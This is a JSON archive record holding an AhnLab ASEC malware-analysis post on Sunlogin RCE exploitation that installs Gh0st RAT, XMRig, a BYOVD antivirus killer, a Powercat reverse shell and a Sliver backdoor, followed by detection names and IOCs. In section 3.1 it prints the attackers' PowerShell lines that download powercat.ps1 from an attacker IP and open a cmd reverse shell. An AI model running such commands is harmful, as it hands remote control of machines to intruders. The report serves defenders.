{
    "id": "a833348b-49a7-4d11-abd0-ef98d94d4f7e",
    "created_at": "2023-04-05T02:10:18.106981Z",
    "updated_at": "2025-03-27T02:13:58.363249Z",
    "deleted_at": null,
    "sha1_hash": "fe0be0c7850561e7d1f0ad86a4ed99ba905e06d5",
    "title": "2023-02-06 - Sliver Malware With BYOVD Distributed Through Sunlogin Vulnerability Exploitations",
    "authors": "",
    "file_creation_date": "2023-04-03T08:31:07Z",
    "file_modification_date": "2023-04-03T08:31:07Z",
    "file_size": 4350051,
    "plain_text": "# Sliver Malware With BYOVD Distributed Through Sunlogin Vulnerability Exploitations\n\n**asec.ahnlab.com/en/47088/**\n\nBy Sanseo February 6, 2023\n\nSliver is an open-source penetration testing tool developed in the Go programming\nlanguage. Cobalt Strike and Metasploit are major examples of penetration testing tools used\nby many threat actors, and various attack cases involving these tools have been covered\nhere on the ASEC blog. Recently, there have been cases of threat actors using Sliver in\naddition to Cobalt Strike and Metasploit.\n\nThe ASEC (AhnLab Security Emergency response Center) analysis team is monitoring\nattacks against systems with either unpatched vulnerabilities or misconfigured settings.\nDuring this process, we have recently discovered a Sliver backdoor being installed through\nwhat is presumed to be vulnerability exploitation on certain software. Not only did threat\nactors use the Sliver backdoor, but they also used the BYOVD (Bring Your Own Vulnerable\nDriver) malware to incapacitate security products and install reverse shells.\n\nThe software that was targeted by this vulnerability exploitation was Sunlogin, a remotecontrol program developed in China. Sunlogin, which had its remote code execution\nvulnerability (CNVD-2022-10270 / CNVD-2022-03672) and the code that exploited said\nvulnerability made publicly available last year, is still being targeted by vulnerability attacks.\n\n\n-----\n\nFirst, a brief summary of the Sliver penetration testing tool will be given. Afterward, cases\ninvolving the continuous Sunlogin attacks will be covered through our ASD (AhnLab Smart\nDefense) logs. Finally, we will break down the recently confirmed attack cases where Sliver\nand BYOVD were ultimately installed.\n\n## 1. Sliver\n\nPenetration testing tools are used for the purpose of checking the security vulnerabilities\nwithin the network and systems of companies and institutes. They can potentially be used for\nmalicious purposes if placed in the hands of threat actors as they generally provide various\nfeatures for each penetration testing stage.\n\nThe most well-known commercial penetration testing tool would most likely be Cobalt Strike.\nFollowing the release of its cracked version, it is still being used by various threat actors to\nthis very day. There is also the tool developed in open-source, Metasploit, which is similarly\neasy to obtain and thus often used in attacks. There are many other penetration testing tools\naside from Cobalt Strike and Metasploit, but a majority of recent cases were found to be\nusing the open-source penetration testing tool, Sliver. **[[1]](https://github.com/BishopFox/sliver)**\n\n\n-----\n\nFigure 1. Sliver description\nAmong the characteristics of Sliver, the fact that it was developed using Go, a cross platformsupporting language, allows it to support Windows, Linux, and macOS. Its comparatively\nrecent development could also be considered a defining characteristic, but this is because\nthe tools that have been consistently used by threat actors since the past, like Cobalt Strike\nand Metasploit, are more prone to being detected by security products compared to Sliver.\nTherefore, Sliver is being used by various threat actors in place of existing tools like Cobalt\nStrike. **[[2]](https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors)** **[[3]](https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/)** **[[4]](https://www.proofpoint.com/us/blog/security-briefs/ta551-uses-sliver-red-team-tool-new-activity)**\n\nCommands can be sent by the threat actor through the backdoor created by Sliver to\nperform a variety of malicious behaviors. Its features include most of the features supported\nby typical backdoors and RAT malware, such as process and file handling, command\nexecution, uploading/downloading files, and screenshot capturing. It also provides other\nfeatures necessary for overtaking internal networks, such as privilege escalation, process\nmemory dumping, and lateral movement.\n\n\n-----\n\nFigure 2. Command transmission process to the installed Sliver backdoor\n\n\n-----\n\nFigure 3. A portion of the commands supported by Sliver\nIn addition to file, behavior, and memory detection, anti-malware security products are also\ncapable of detecting network behaviors like when a malware strain tries to communicate with\nC&C servers. Therefore, various penetration testing tools, including Cobalt Strike, provide\nmultiple ways to bypass communicating with the C&C server in order to evade network\ndetection. Sliver also supports methods that use mTLS, WireGuard, HTTP(S), and DNS to\ncommunicate with the C&C server, which allows it to evade the network detection of security\nproducts through the encryption of network communication.\n\nSession Mode and Beacon Mode are the two modes also supported by the Sliver backdoor.\nSliver that has been built in Session Mode communicates with the C&C server in real-time\nwhile the Sliver built in Beacon Mode communicates with the C&C server asynchronously.\nThe latter obtains commands or task lists from the C&C server and sends the results after\nexecuting them.\n\n## 2. Vulnerability Exploitations and Attacks Targeting Sunlogin\n\n\n-----\n\nSunlogin is a remote-control utility developed by the Chinese tech company, Oray. In 2022,\nthe remote code execution vulnerability, CNVD-2022-10270 / CNVD-2022-03672, was made\n[publicly available along with the code that exploited it, [5] after which attacks that abused](https://mdnice.com/writing/8a41e22d1d0744bd9e8ab5999d3cfebe)\nthese were found. We assume that “SunloginCLient.exe” is the vulnerable process that is\n[being targeted by attacks, [6] and multiple attacks have been confirmed since early 2022](https://wiki.y1ng.org/0x2_%20%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E/2x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CNVD-2022-03672-%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E/)\naccording to our ASD logs.\n\n**2.1. Gh0st RAT**\n\nAlthough the packet used in the attack has not been found, it is assumed that the malware\nare installed through the Sunlogin RCE vulnerability exploitation following the PowerShell\ncommand ran on the “SunloginCLient.exe” process. The “SunloginCLient.exe” process used\nin the actual attacks is an earlier version than v11.0.0.33, which is known to have been\npatched. The following is the process tree of the PowerShell command that downloads and\ninstalls Gh0st RAT. It is through this that we can confirm that the PowerShell command was\nrun by the “SunloginCLient.exe” process.\n\nFigure 4. Gh0st RAT installation process tree\nAside from this, an assumption can also be inferred by examining the command used in the\nattacks. PoC, which was revealed first, uses the following command when exploiting\n[vulnerabilities. [7]](https://github.com/Mr-xn/sunlogin_rce)\n\nFigure 5. PoC’s vulnerability exploitation routine\n\n\n-----\n\nThe command used in the aforementioned Gh0st RAT attack is as follows and is similar to\nthe command used in the PoC above.\n\nFigure 6. PowerShell command used in attacks\n\n**2.2. XMRig CoinMiner**\n\nThreat actors occasionally install XMRig CoinMiner instead of Gh0stRAT. According to our\nASD log, the following command is executed via the “SunloginCLient.exe” process which\ndownloads and runs “syse.bat”, the batch malware.\n\nFigure 7. Vulnerability exploitation command that installs XMRig CoinMiner\n“syse.bat” downloads either the “t.zip” or “t_64.zip” compressed file alongside 7z according\nto the hardware environment. The files are then unzipped in either the\n“C:\\windows\\WinSysMaintenance\\.arc ” or “C:\\WinSysMaintenance\\.arc ” directories\ndepending on the privilege.\n\n\n-----\n\nFigure 8. Download routine for the compressed file containing malware\nInstead of XMRig CoinMiner being contained as-is within the compressed file, it is executed\nthrough the launcher and loader malware. “watch.exe” is the launcher and “splwow32.exe” is\nthe loader malware that loads and decodes the encoded XMRig, “WINSysCoreR.bin”, before\nexecuting it in the memory.\n\nFigure 9. Compressed file containing malware\nAfterward, “syse.bat” changes the XMRig wallet address and transfers “WINSysCoreR.bin”\nas an argument of “splwow32.exe” before executing it. This starts the Monero coin mining\nprocess in the infected system.\n\nFigure 10. XMRig execution routine\n\n## 3. Cases of Recent Attacks\n\n\n-----\n\nThere have been a steady number of attacks targeting the Sunlogin RCE vulnerability. Most\nof these cases involved the installation of Gh0st RAT and XMRig CoinMiner. In this blog post,\nwe will be covering the recently confirmed attacks where a Sliver backdoor and Powercat\nreverse shell were installed.\n\nThe threat actor first installed a PowerShell script using the Sunlogin RCE vulnerability. This\nPowerShell script functioned by using the BYOVD technique to incapacitate security\nproducts installed in the system before installing a reverse shell using Powercat. It is\nunconfirmed whether it was done by the same threat actor, but after a few hours, a log\nshows that a Sliver backdoor was installed on the same system through a Sunlogin RCE\nvulnerability exploitation.\n\n**3.1. BYOVD & Powercat**\n\nThe first command executed on the target system is a command that downloads and\nexecutes the following “2.ps1” PowerShell script.\n\nFigure 11. PowerShell command that installs the loader malware\nThe PowerShell script is obfuscated, but upon closer examination, we can see that it has a\nsimple structure with the following two major features. The first feature decodes the\ncompressed .NET PE before loading and executing it in the memory. The encoded PE is\ndeveloped in .NET, and the function\nkdjvasbulidcfaeusyefoaexwyroaw7fyoaeufhodusicvfy8cye() is executed through a\nPowerShell command.\n\nFigure 12. Decoded PowerShell command – Modified\n\n\n-----\n\nujacldfajlvjfaslflcevdfuaelfiua.exe is assumed to be the open-source tool\nMhyprot2DrvControl that was personally modified by the threat actor to forcefully terminate\n[security products. [8] Unlike the open-source tool, the malware has the following AvList](https://github.com/kagurazakasanae/Mhyprot2DrvControl)\nwhich contains the process names of anti-malware products to be forcefully terminated.\n\nFigure 13. List of anti-malware products to be force terminated\nMhyprot2DrvControl uses the BYOVD (Bring Your Own Vulnerable Driver) technique, which\nabuses vulnerable Windows driver files and uses the escalated privilege to perform arbitrary\nbehaviors. Recently, many threat actors have been using this technique to escalate their\n[privileges and forcefully terminate security products to evade detection. [9]](https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html)\n\nMhyprot2DrvControl specifically abuses the mhyprot2.sys file. This file is an anti-cheat driver\ndeveloped by the Chinese game company miHoYo, the creators of Genshin Impact.\nmhyprot2.sys is a normal, authenticated driver file with a valid signature, but the process that\ncalls this file has vulnerable verification conditions. Through a simple bypassing process, the\nmalware can access the kernel area through mhyprot2.sys. The developer of\nMhyprot2DrvControl provided multiple features that can be utilized with the privileges\nescalated through mhyprot2.sys. Among these, the threat actor used the feature which\nallows the force termination of processes to develop a malware that shuts down multiple antimalware products.\n\n\n-----\n\nFigure 14. Routine for checking the process list to terminate AV products\nThe second feature of the PowerShell script is downloading Powercat from an external\nsource and using it to run the reverse shell in the infected system. When executed, the\nreverse shell connects to the C&C server and provides the threat actor control over the\ninfected system by providing the cmd.exe, in other words, the shell.\n\nIEX (New-Object\nNet.Webclient).DownloadString(“hxxp://45.144.3[.)216/powercat.ps1”);\n\npowercat -c 45.144.3.216 -p 14356 -e cmd\n\n**3.2. Sliver Backdoor Attack**\n\nBeside the PowerShell script above, the threat actor used the vulnerability to execute a\nPowerShell command that installed the “acl.exe” malware. The following is our ASD log of\nthe PowerShell command executed through the Sunlogin RCE vulnerability.\n\nFigure 15. Sliver backdoor installed through the Sunlogin vulnerability\n\n\n-----\n\nFigure 16. PowerShell command that installs the Sliver backdoor\nThe downloaded “acl.exe” is the Sliver backdoor. Sliver is normally obfuscated when the\nbackdoor is built. Thus, only the obfuscated Go functions can be seen even after\ndecompiling. This means that the threat actor used the binaries generated by the Sliver\nframework in the attacks as-is without additional packing processes.\n\nFigure 17. Obfuscated Sliver backdoor\nSince the function name is obfuscated but the practical routine remains the same, static\nanalysis shows that Sliver utilized in the attack was built in Session Mode and used the\nmTLS protocol for communication with the C&C server. Additionally, the team found the\nconfiguration data that was decoded together with the Sliver backdoor’s name and C&C\nserver address through the debugging process as shown in Figure 18.\n\nFigure 18. Decoded configuration data\n\n**Sliver backdoor name: LITERARY_WHOLE**\n**C&C server address: mtls://43.128.62[.]42:8888**\n\n## 4. Conclusion\n\n\n-----\n\nRecently, the team has confirmed cases of attack where various strains of malware, including\nthe Sliver backdoor, were installed on vulnerable and unpatched software. Sliver is being\nused in various forms of attack by recent attack groups that steal information from company\nsystems and install ransomware on them. This is because, as a penetration testing tool,\nSliver offers the required step-by-step features like account information theft, internal network\nmovement, and overtaking the internal network of companies, just like Cobalt Strike.\n\nUsers should apply the latest patch to their installed software to prevent vulnerability\nexploitations in advance. Also, V3 should be updated to the latest version so that malware\ninfection can be prevented.\n\n**File Detection**\n\n– CoinMiner/BAT.Generic.SC185824 (2023.01.24.03)\n\n– Trojan/Win.Launcher.C5364876 (2023.01.24.00)\n\n– Trojan/Win.Loader.C5364877 (2023.01.24.00)\n\n– CoinMiner/BIN.Encoded (2023.01.24.03)\n\n– CoinMiner/Text.Config (2023.01.24.03)\n\n– Trojan/Win32.RL_Agent.R362708 (2021.01.12.05)\n\n– Trojan/PowerShell.Obfuscated (2023.01.24.03)\n\n– Trojan/Win.KILLAV.C5363966 (2023.01.22.02)\n\n– Trojan/PowerShell.Powercat.S1567 (2021.07.07.02)\n\n– Trojan/Win.Sliver.C5363965 (2023.01.22.02)\n\n**Behavior Detection**\n\n– Execution/MDP.Powershell.M2514\n\n– Malware/MDP.DriveByDownload.M1659\n\n**AMSI Detection**\n– Trojan/Win.KILLAV.C5363966 (2023.01.22.02)\n\n– Trojan/PowerShell.Powercat.SA1567 (2021.07.07.02)\n\n**IOC**\n\n**MD5**\n\n– 836810671d8e1645b7dd35b567d75f27 : XMRig Downloader Batch (syse.bat)\n\n– 29d04d986a31fbeab39c6b7eab5f5550 : Launcher (watch.exe)\n\n– 17a84000567055be92bda8659de5184d : Loader (splwow32.exe)\n\n– 57b21f6b5d50e4ec525bee77bc724a4d : Encoded XMRig (WINSysCoreR.bin)\n\n– 7eaa2e3d9c8b7aa6ecdd8dad0d1ba673 : config.json\n\n– 1c5e484da6e6e1c2246f6d65f23bb49b : config.json\n\n– 8c10401a59029599bed435575914b30d : Gh0stRAT\n\n– 2434d32b1bebf22ac7ab461a44cf1624 : Powershell Script (2.ps1)\n\n– f71b0c2f7cd766d9bdc1ef35c5ec1743 : AV Killer – BYOVD\n\n\n-----\n\n(ujacldfajlvjfaslflcevdfuaelfiua.exe)\n– 8a319fa42e7c7432318f28a990f15696 : Powercat (powercat.ps1)\n\n– 6f0c0faada107310bddc59f113ae9013 : Sliver Backdoor (acl2.exe)\n\n**Download**\n\n– hxxp://5.199.173[.]103/syse.bat : XMRig Downloader Batch\n\n– hxxp://5.199.173[.]103/t.zip : XMRig zip\n\n– hxxp://5.199.173[.]103/t_64.zip : XMRig zip\n\n– hxxp://5.199.173[.]103/7za.exe : 7z\n\n– hxxp://61.155.8[.]2:81/c6/include/images/help23.sct : Gh0st RAT\n\n– hxxp://45.144.3[.]216/2.ps1 : PowerShell Malware\n\n– hxxp://45.144.3[.]216/powercat.ps1 : Powercat\n\n– hxxp://43.128.62[.]42/acl.exe : Sliver Backdoor\n\n**C&C**\n\n– idc6.yjzj[.]org:56573 : Gh0st RAT\n\n– 45.144.3[.]216:14356 : Powercat Reverse Shell\n\n– 43.128.62[.]42:8888 : Sliver Backdoor\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information-en/)\n\n[Tagged as:BYOVD,Powercat,Sliver,Sunlogin,Vulnerability](https://asec.ahnlab.com/tag/byovd/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-06 - Sliver Malware With BYOVD Distributed Through Sunlogin Vulnerability Exploitations.pdf"
    ],
    "report_names": [
        "2023-02-06 - Sliver Malware With BYOVD Distributed Through Sunlogin Vulnerability Exploitations.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1680660618,
    "ts_updated_at": 1743041638,
    "ts_creation_date": 1680510667,
    "ts_modification_date": 1680510667,
    "files": {
        "pdf": "https://archive.orkl.eu/fe0be0c7850561e7d1f0ad86a4ed99ba905e06d5.pdf",
        "text": "https://archive.orkl.eu/fe0be0c7850561e7d1f0ad86a4ed99ba905e06d5.txt",
        "img": "https://archive.orkl.eu/fe0be0c7850561e7d1f0ad86a4ed99ba905e06d5.jpg"
    }
}